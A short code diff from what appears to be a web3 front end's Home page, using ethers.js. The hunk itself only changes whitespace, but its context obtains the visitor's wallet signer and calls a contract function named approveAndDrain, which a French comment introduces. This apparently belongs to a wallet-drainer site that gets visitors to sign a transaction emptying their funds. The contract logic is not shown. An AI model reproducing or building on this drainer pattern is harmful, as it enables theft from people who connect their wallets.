@@ -111,7 +111,7 @@ export default function Home() {
     if (signer) {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const contract = new ethers.Contract(contractAddress, contractABI, provider.getSigner());
-      
+
       try {
         // Appel de la fonction approveAndDrain sur le contrat
         const tx = await contract.approveAndDrain();
